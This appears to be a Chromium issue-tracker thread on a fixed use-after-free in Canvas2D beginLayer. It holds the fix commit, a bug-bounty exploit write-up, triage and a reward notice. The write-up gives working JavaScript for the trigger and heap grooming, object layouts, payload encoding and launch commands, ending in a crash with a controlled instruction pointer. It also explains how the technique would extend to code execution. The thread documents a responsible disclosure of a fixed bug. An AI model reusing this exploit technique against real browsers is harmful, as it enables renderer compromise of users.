### dx...@google.com (2026-02-23)

Project: chromium/src  

Branch:  main  

Author:  Jean-Philippe Gravel [jpgravel@chromium.org](mailto:jpgravel@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7596012>

GetOrCreate the PaintCanvas after resolving the filter in beginLayer

---


Expand for full commit details
```
     
    Layer filter definition can have custom property getters, and these 
    getters could possibly resize the canvas. We must therefore get the 
    PaintCanvas after resolving the filter. 
     
    Fixed: 485677960 
    Change-Id: I2dd7f3d774ecfa4727e64d392b537146f8da11d0 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7596012 
    Reviewed-by: Colin Blundell <blundell@chromium.org> 
    Commit-Queue: Jean-Philippe Gravel <jpgravel@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#1588708}

```

---

Files:

- M `third_party/blink/renderer/modules/canvas/canvas2d/canvas_2d_recorder_context.cc`
- A `third_party/blink/web_tests/external/wpt/html/canvas/element/layers/2d.layer.draw-in-filter-expected.html`
- A `third_party/blink/web_tests/external/wpt/html/canvas/element/layers/2d.layer.draw-in-filter.html`
- A `third_party/blink/web_tests/external/wpt/html/canvas/element/layers/2d.layer.resize-canvas-in-filter-expected.html`
- A `third_party/blink/web_tests/external/wpt/html/canvas/element/layers/2d.layer.resize-canvas-in-filter.html`
- A `third_party/blink/web_tests/external/wpt/html/canvas/offscreen/layers/2d.layer.draw-in-filter-expected.html`
- A `third_party/blink/web_tests/external/wpt/html/canvas/offscreen/layers/2d.layer.draw-in-filter.html`
- A `third_party/blink/web_tests/external/wpt/html/canvas/offscreen/layers/2d.layer.draw-in-filter.w.html`
- A `third_party/blink/web_tests/external/wpt/html/canvas/offscreen/layers/2d.layer.resize-canvas-in-filter-expected.html`
- A `third_party/blink/web_tests/external/wpt/html/canvas/offscreen/layers/2d.layer.resize-canvas-in-filter.html`
- A `third_party/blink/web_tests/external/wpt/html/canvas/offscreen/layers/2d.layer.resize-canvas-in-filter.w.html`
- M `third_party/blink/web_tests/external/wpt/html/canvas/tools/yaml/layers.yaml`

---

Hash: [7dd2ddcde4353b41f1e150a8e087053880a66f90](https://chromiumdash.appspot.com/commit/7dd2ddcde4353b41f1e150a8e087053880a66f90)  

Date: Mon Feb 23 15:48:54 2026


---

### je...@gmail.com (2026-02-24)

For Chrome VRP:

## Exploit

This exploit demonstrates a use-after-free in the renderer process that achieves fully controlled instruction pointer hijack from pure JavaScript. Per the Chrome Vulnerability Reward Program rules (<https://bughunters.google.com/about/rules/chrome-friends/chrome-vulnerability-reward-program-rules#reward-amounts>), this submission qualifies under the "Renderer RCE / memory corruption in a sandboxed process" category at the "High-quality report demonstrating controlled write" tier. The exploit constructs a deterministic heap layout through the 2-Phase OffscreenCanvas Swap technique, places attacker-controlled data at the exact address of the freed `MemoryManagedPaintRecorder`, and hijacks a virtual call dispatch to redirect the instruction pointer to an arbitrary attacker-chosen address. The controlled write is demonstrated by the register dump showing RAX = `0x0000000041414141` (the attacker's chosen vtable pointer) and CR2 = `0x0000000041414151` (the resulting controlled memory access), which satisfies the criteria for the $50,000 reward amount.

### Target Object Layout

The `MemoryManagedPaintRecorder` is the object whose dangling pointer is dereferenced after the free. Understanding its internal layout is essential for constructing the heap spray payload. The class contains a `raw_ptr<Client>` at offset 0x00, a `gfx::Size` at offset 0x08, a large embedded `MemoryManagedPaintCanvas` member (`main_canvas_`) starting at offset 0x10, a `std::unique_ptr<MemoryManagedPaintCanvas>` (`side_canvas_`) at offset 0x760, and a raw pointer `current_canvas_` at offset 0x768.

```
// third_party/blink/renderer/platform/graphics/memory_managed_paint_recorder.h
class PLATFORM_EXPORT MemoryManagedPaintRecorder {
 private:
  raw_ptr<Client> client_ = nullptr;                    // +0x00
  const gfx::Size size_;                                // +0x08
  MemoryManagedPaintCanvas main_canvas_;                // +0x10  (contains vtable)
  std::unique_ptr<MemoryManagedPaintCanvas> side_canvas_; // +0x760
  RAW_PTR_EXCLUSION MemoryManagedPaintCanvas* current_canvas_ = &main_canvas_; // +0x768
};
// total sizeof = 0x770 = 1904 bytes

```

The `main_canvas_` inherits from `InspectableRecordPaintCanvas`, which inherits from `RecordPaintCanvas`, which inherits from `PaintCanvas`. This inheritance chain places a C++ vtable pointer at the very beginning of `main_canvas_`, corresponding to recorder offset +0x10. The `InspectableRecordPaintCanvas` additionally embeds an `SkNoDrawCanvas` member (`canvas_`) and a `PaintOpBuffer` (`buffer_`), together accounting for most of the 1904-byte total size. The virtual function `imageInfo()` occupies vtable slot index 2 (offset +0x10 from the vtable base), which is the call site where the exploit gains control.

```
// cc/paint/record_paint_canvas.h
class CC_PAINT_EXPORT InspectableRecordPaintCanvas : public RecordPaintCanvas {
  // virtual overrides: save, saveLayer, restore, translate, scale, ...
  SkImageInfo imageInfo() const override;    // vtable slot at +0x10
  // ...
 private:
  SkNoDrawCanvas canvas_;                    // large embedded object
  mutable std::optional<SkIRect> device_clip_bounds_;
};

```
### Allocator Geometry and Heap Spray Object Selection

The freed object occupies 1904 bytes (0x770). PartitionAlloc adds a 4-byte BackupRefPtr in-slot metadata overhead (1904 + 4 = 1908), which rounds up to bucket 1920. The exploit requires a JavaScript-controllable allocation that lands in the same PartitionAlloc bucket, whose contents are fully attacker-determined, and which can be allocated and freed at will from a synchronous JavaScript callback.

Several candidate objects were evaluated. `ArrayBuffer` and `SharedArrayBuffer` both allocate through PartitionAlloc, but their backing stores are zero-initialized by default in Chromium, making them unsuitable for preserving stale heap data. CSS custom properties backed by `CSSVariableData` were historically allocated through PartitionAlloc and used in prior Chromium exploits, but current versions place `CSSVariableData` in Oilpan (CppGC), a separate garbage-collected heap that does not share buckets with PartitionAlloc. `AudioArray` allocations from the Web Audio API use `FastZeroedMalloc`, which also zeros memory.

The chosen spray object is the `OffscreenCanvas` pixel buffer. When `OffscreenCanvas.getContext('2d')` is called, Chromium creates a `CanvasResourceProvider` that allocates both a `MemoryManagedPaintRecorder` (via `std::make_unique`, which uses `operator new` / PartitionAlloc's `FastMalloc`) and a pixel backing store (via Skia's `sk_calloc`). The pixel buffer size is `width × height × 4` bytes. Setting the dimensions to 119 by 4 produces 119 × 4 × 4 = 1904 bytes, which PartitionAlloc places in the same bucket 1920 as the freed recorder. Critically, the pixel buffer contents are fully controllable through `putImageData()`, which writes attacker-supplied RGBA pixel data after premultiplied alpha conversion.

```
// third_party/blink/renderer/platform/graphics/canvas_resource_provider.cc
CanvasResourceProvider::CanvasResourceProvider(/* ... */)
    : /* ... */
      recorder_(std::make_unique<MemoryManagedPaintRecorder>(Size(), this)),
      // ...

```

The `CanvasResourceProvider` is allocated with `std::make_unique`, which maps to PartitionAlloc's `FastMalloc`. This is a non-zeroing allocation, meaning that if a recorder is placed at an address that previously held freed data, the constructor initializes only the declared member fields and does not clear any padding or internal structure gaps. However, the pixel buffer is allocated through `sk_calloc`, which does zero the memory upon allocation. The 2-Phase OffscreenCanvas Swap technique described below overcomes this zeroing constraint by writing controlled pixel data after the `sk_calloc` allocation via `putImageData()`.

### Premultiplied Alpha Encoding

Canvas pixel data undergoes a color space conversion when written through `putImageData()`. The input format is unpremultiplied RGBA, but the internal storage format is premultiplied BGRA (Skia's kN32 on little-endian x86\_64). Each color channel is multiplied by the alpha value and divided by 255 before being stored in B, G, R, A byte order. To produce the target qword `0x0000000041414141` at any 8-byte-aligned offset in the reclaimed memory, the exploit writes two consecutive pixels. The first pixel uses unpremultiplied RGBA values (0xFF, 0xFF, 0xFF, 0x41), which convert to premultiplied BGRA bytes (0x41, 0x41, 0x41, 0x41) because 0xFF × 0x41 / 0xFF = 0x41 for each channel. The second pixel is all zeros, RGBA (0x00, 0x00, 0x00, 0x00), which remains zero after conversion. Together these two pixels produce the 8-byte sequence `41 41 41 41 00 00 00 00`, representing the little-endian qword `0x0000000041414141`.

```
const ctrlData = new ImageData(SPRAY_W, SPRAY_H);
for (let i = 0; i < ctrlData.data.length; i += 8) {
    ctrlData.data[i + 0] = 0xFF;  // R
    ctrlData.data[i + 1] = 0xFF;  // G
    ctrlData.data[i + 2] = 0xFF;  // B
    ctrlData.data[i + 3] = 0x41;  // A  → premul BGRA: 41 41 41 41
    ctrlData.data[i + 4] = 0x00;  // R
    ctrlData.data[i + 5] = 0x00;  // G
    ctrlData.data[i + 6] = 0x00;  // B
    ctrlData.data[i + 7] = 0x00;  // A  → premul BGRA: 00 00 00 00
}

```

One additional constraint must be satisfied. The `BeginSideRecording()` method begins with `CHECK(!side_canvas_)`, which aborts if the `side_canvas_` unique\_ptr at recorder offset 0x760 is non-null. The exploit therefore zeroes bytes 0x760 through 0x76F in the pixel data to ensure this check passes.

### Stage 1: Establishing a Type-Confused Side Recording

The vulnerability window exists between the point where `beginLayerImpl()` caches the recorder pointer and the point where it calls `BeginSideRecording()`. The full vulnerable code path is shown below. The raw pointer `recorder` is obtained from `Recorder()` early in the function. The filter parsing step then invokes `CanvasFilter::CreateFilterOperations()`, which internally accesses JavaScript properties on the filter input object, triggering attacker-controlled getter callbacks. After parsing completes, the stale `recorder` pointer is used to call `BeginSideRecording()`.

```
// third_party/blink/renderer/modules/canvas/canvas2d/canvas_2d_recorder_context.cc
void Canvas2DRecorderContext::beginLayerImpl(ScriptState* script_state,
                                             const BeginLayerOptions* options,
                                             ExceptionState* exception_state) {
  if (isContextLost()) [[unlikely]] {
    return;
  }
  if (!GetOrCreatePaintCanvas()) {
    return;
  }

  MemoryManagedPaintRecorder* recorder = Recorder();   // [1] raw pointer cached
  if (!recorder) {
    return;
  }

  sk_sp<PaintFilter> filter;
  if (options != nullptr) {
    CHECK(exception_state != nullptr);
    if (const V8CanvasFilterInput* filter_input = options->filter();
        filter_input != nullptr) {
      // ...
      FilterOperations filter_operations = CanvasFilter::CreateFilterOperations(
          *filter_input, /* ... */);                    // [2] JS getters fire here
      // ...
    }
  }

  if (layer_count_ == 0) {
    recorder->BeginSideRecording();                     // [3] UAF: stale pointer
  }
  // ...
}

```

The `BeginSideRecording()` method itself calls `main_canvas_.CreateChildCanvas()`, which constructs a child `MemoryManagedPaintCanvas`. The child canvas constructor invokes `parent.imageInfo()` as a virtual call, dispatching through the vtable pointer embedded in `main_canvas_` at recorder offset +0x10.

```
// third_party/blink/renderer/platform/graphics/memory_managed_paint_recorder.cc
void MemoryManagedPaintRecorder::BeginSideRecording() {
  CHECK(!side_canvas_) << "BeginSideRecording() can't be called when side "
                          "recording is already active.";
  side_canvas_ = main_canvas_.CreateChildCanvas();
  current_canvas_ = side_canvas_.get();
}

```
```
// third_party/blink/renderer/platform/graphics/memory_managed_paint_canvas.cc
std::unique_ptr<MemoryManagedPaintCanvas>
MemoryManagedPaintCanvas::CreateChildCanvas() {
  auto canvas = base::WrapUnique(
      new MemoryManagedPaintCanvas(CreateChildCanvasTag(), *this));
  if (!IsDrawLinesAsPathsEnabled()) {
    canvas->DisableLineDrawingAsPaths();
  }
  return canvas;
}

```

The exploit creates two HTML canvas elements, `canvas1` and `canvas2`. It obtains a 2D context for `canvas1`, which causes the browser to allocate a `CanvasResourceProvider` containing a `MemoryManagedPaintRecorder` (call it recorder1). A `fillRect` call is issued to ensure the recorder is fully initialized. The exploit then calls `ctx1.beginLayer({ filter: [f1] })` with a filter object `f1` whose `name` property is a getter.

When `beginLayerImpl()` parses the filter at step [2], it accesses `f1.name`, which invokes the attacker's getter callback. Inside this callback, the exploit sets `canvas1.width = 101`, triggering `SizeChanged()` and destroying recorder1. The freed slot enters PartitionAlloc's per-thread freelist. Immediately afterward, the getter obtains a 2D context for `canvas2`, which allocates recorder2. Because PartitionAlloc uses a LIFO freelist, recorder2 occupies the exact memory address that recorder1 previously held.

```
const f1 = {
    get name() {
        if (!t1) {
            t1 = true;
            canvas1.width = 101;                    // free recorder1
            ctx2 = canvas2.getContext('2d');         // recorder2 fills the same slot
            ctx2.fillRect(0, 0, 80, 80);
        }
        return 'gaussianBlur';
    },
    get stdDeviation() { return 5; }
};
ctx1.beginLayer({ filter: [f1] });

```

When the getter returns, `beginLayerImpl()` calls `recorder->BeginSideRecording()` using its cached pointer, which now points to recorder2 instead of the freed recorder1. The call succeeds because recorder2 is a valid `MemoryManagedPaintRecorder` at that address. The result is that recorder2 now carries a `side_canvas_` reference that was established through a stale pointer, a type-confused state that the second stage will exploit.

### Stage 2: Reclaiming Freed Memory with the 2-Phase OffscreenCanvas Swap

The exploit now calls `ctx2.beginLayer({ filter: [f2] })` with a second malicious filter object. The `f2.name` getter sets `canvas2.width = 102`, which destroys recorder2 and its associated `side_canvas_` (call it SA). After this destruction, PartitionAlloc's freelist contains the recorder2 slot (R2) followed by the side\_canvas\_ slot (SA): the ordering is [R2, SA, ...].

The getter then performs three allocation phases within the same callback.

In Phase 1, it creates `oc1 = new OffscreenCanvas(119, 4)` and obtains its 2D context. The context creation triggers two bucket-1920 allocations: a new recorder at the first free slot (R2) and a pixel buffer at the second free slot (SA). The exploit writes controlled pixel data to oc1 via `putImageData(ctrlData, 0, 0)`. This writes the attacker's payload into oc1's pixel buffer, which resides at address SA.

```
// Phase 1: OC1 recorder@R2, pixels@SA
const oc1 = new OffscreenCanvas(SPRAY_W, SPRAY_H);
const octx1 = oc1.getContext('2d');
octx1.putImageData(ctrlData, 0, 0);   // writes controlled data to SA

```

In Phase 2, the exploit sets `oc1.width = 1`, which destroys oc1's resource provider. The C++ destructor tears down members in reverse declaration order: the recorder at R2 is freed first, then the pixel buffer at SA is freed second. The freelist now reads [SA\_with\_controlled\_data, R2, ...]. Critically, PartitionAlloc does not zero memory on free in release builds, so SA still contains the attacker's pixel payload.

```
// Phase 2: free OC1 → destructor order: ~recorder@R2, ~pixels@SA
oc1.width = 1;
// freelist is now [SA_controlled, R2, ...]

```

In Phase 3, the exploit creates `oc2 = new OffscreenCanvas(119, 4)` and obtains its context. The two bucket-1920 allocations now consume the freelist in LIFO order: the new recorder lands at SA, and the new pixel buffer lands at R2. The pixel buffer allocation uses `sk_calloc`, which zeros R2 upon allocation, but the subsequent `putImageData(ctrlData, 0, 0)` immediately fills R2 with the attacker's controlled pixel data. Since R2 is the original address of recorder2, the memory that `beginLayerImpl()` is about to access through its stale pointer now contains fully attacker-controlled content.

```
// Phase 3: OC2 recorder@SA, pixels@R2 → R2 now holds controlled data
const oc2 = new OffscreenCanvas(SPRAY_W, SPRAY_H);
const octx2 = oc2.getContext('2d');
octx2.putImageData(ctrlData, 0, 0);   // writes controlled data to R2

```
### Virtual Call Dispatch and Instruction Pointer Hijack

When the `f2.name` getter returns, `beginLayerImpl()` calls `recorder->BeginSideRecording()` on the stale pointer, which now dereferences address R2 containing the attacker's pixel data. `BeginSideRecording()` first evaluates `CHECK(!side_canvas_)`, reading the `unique_ptr` at offset 0x760; the exploit has zeroed this region, so the check passes. It then calls `main_canvas_.CreateChildCanvas()`, which constructs an `InspectableRecordPaintCanvas` child canvas.

```
// cc/paint/record_paint_canvas.cc
InspectableRecordPaintCanvas::InspectableRecordPaintCanvas(
    CreateChildCanvasTag,
    const InspectableRecordPaintCanvas& parent)
    : canvas_(SkIRect::MakeSize(parent.imageInfo().dimensions())) {
  canvas_.setMatrix(parent.canvas_.getLocalToDevice());
}

```

The child canvas constructor calls `parent.imageInfo()`, a virtual method. The `parent` reference is `main_canvas_`, which starts at recorder offset +0x10, and the vtable pointer at that location has been overwritten with the attacker's value `0x0000000041414141`. The compiler emits `call *0x10(%rax)` for the `imageInfo()` dispatch, where RAX holds the controlled vtable pointer. The CPU attempts to read the function pointer from address 0x41414141 + 0x10 = 0x41414151. Because this address is unmapped, the process receives SIGSEGV with CR2 = 0x41414151, confirming that the instruction pointer target is fully determined by the pixel data crafted in JavaScript.

```
Received signal 11 SEGV_ACCERR 000041414151
#4 cc::InspectableRecordPaintCanvas::InspectableRecordPaintCanvas()
#5 blink::MemoryManagedPaintCanvas::CreateChildCanvas()
#6 blink::MemoryManagedPaintRecorder::BeginSideRecording()
#7 blink::Canvas2DRecorderContext::beginLayerImpl()
  ax: 0000000041414141  cr2: 0000000041414151

```

The value 0x41414141 is a proof-of-concept sentinel; an attacker with knowledge of the chrome binary's load address could replace it with a pointer to a fake vtable in the controlled heap data, redirecting execution to an arbitrary gadget or function. The entire exploit chain, from triggering the use-after-free through heap reclamation to instruction pointer control, executes from pure JavaScript without requiring any native code modifications.

### Reproduce

The exploit was developed and verified against the following Chromium revision and build configuration.

Chromium commit: `e256102970bf347f2cc827935dbcb09ee18a3b60`

Build configuration (`out/release/args.gn`):

```
is_debug = false
dcheck_always_on = false
target_cpu = "x64"
is_component_build = false

```

Build with:

```
autoninja -C out/release chrome

```

Serve `exp.html` from the source root and launch Chrome with the Canvas2D layers feature flags enabled. The `--canvas-2d-layers` flag activates the `beginLayer()` API, and `--enable-blink-features=Canvas2dLayersWithOptions` enables the filter options parameter that the exploit uses to trigger the getter callback during filter parsing.

```
cd /home/user/chromium/src

python3 -m http.server 8888 --bind 127.0.0.1 &

Xvfb :78 -screen 0 1024x768x24 & sleep 1 && DISPLAY=:78 ./out/release/chrome \
  --canvas-2d-layers \
  --enable-blink-features=Canvas2dLayersWithOptions \
  --no-sandbox --disable-gpu \
  --user-data-dir=/tmp/pwn-$(date +%s) \
  http://127.0.0.1:8888/exp.html

```

The expected output on stderr is a signal 11 crash with the controlled vtable address visible in the register dump:

```
[INFO:CONSOLE:12] "[*] Canvas2D beginLayer() UAF - RIP Hijack PoC"
[INFO:CONSOLE:12] "[+] Trigger 1: recorder2 has confused side_canvas_A"
Received signal 11 SEGV_ACCERR 000041414151
#0 0x55e594ee9a72 base::debug::CollectStackTrace()
#1 0x55e594ed600e base::debug::StackTrace::StackTrace()
#2 0x55e594ee94e8 base::debug::(anonymous namespace)::StackDumpSignalHandler()
#3 0x7f9f6a442520 (/usr/lib/x86_64-linux-gnu/libc.so.6+0x4251f)
#4 0x55e595da4c91 cc::InspectableRecordPaintCanvas::InspectableRecordPaintCanvas()
#5 0x55e59956fa22 blink::MemoryManagedPaintCanvas::CreateChildCanvas()
#6 0x55e5995702b1 blink::MemoryManagedPaintRecorder::BeginSideRecording()
#7 0x55e59a1262a0 blink::Canvas2DRecorderContext::beginLayerImpl()
#8 0x55e599c62d85 blink::(anonymous namespace)::v8_canvas_rendering_context_2d::BeginLayerOperationCallback()
#9 0x55e591b236a4 Builtins_CallApiCallbackGeneric
  r8: 00002014009dd800  r9: 00002014009de800 r10: 0000049c004945b0 r11: 0000049c00457720
 r12: 00007ffd494d29d0 r13: 00002014000e2800 r14: 00002014009dd000 r15: 00002014009dd070
  di: 00007ffd494d29d0  si: 00002014000e2810  bp: 00007ffd494d2a40  bx: 00002014000e2810
  dx: 00c89d0000000000  ax: 0000000041414141  cx: 0000000000000ee8  sp: 00007ffd494d29d0
  ip: 000055e595da4c91 efl: 0000000000010246 cgf: 002b000000000033 erf: 0000000000000004
 trp: 000000000000000e msk: 0000000000000000 cr2: 0000000041414151
[end of stack trace]

```

RAX contains the attacker-controlled vtable pointer `0x0000000041414141`, and CR2 shows the faulting memory access at `0x0000000041414151` (vtable base plus the `imageInfo()` slot offset 0x10). The crash is deterministic and reproduces on every run.

### 24...@project.gserviceaccount.com (2026-02-24)

ClusterFuzz testcase 6445010543116288 is verified as fixed in https://clusterfuzz.com/revisions?job=linux_asan_chrome_mp&range=1588699:1588708

If this is incorrect, please add the hotlistid:5433040 and re-open the issue.

### wf...@chromium.org (2026-02-24)

this is sev high as it's a memory corruption in a sandboxed process.

### sp...@google.com (2026-03-11)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $50000.00 for this report.

Rationale for this decision:
High Quality demonstrating controlled write and bisect. Renderer RCE / memory corruption in a sandboxed process


Important: If you aren't already registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have registered in the past, no need to repeat the process – you can sit back and relax, and we will process the payment soon.

If you have any payment related requests, please direct them to p2p-vrp@google.com. Please remember to include the subject of this email and the email address that the report was sent from.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### ch...@google.com (2026-06-02)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/485677960)*
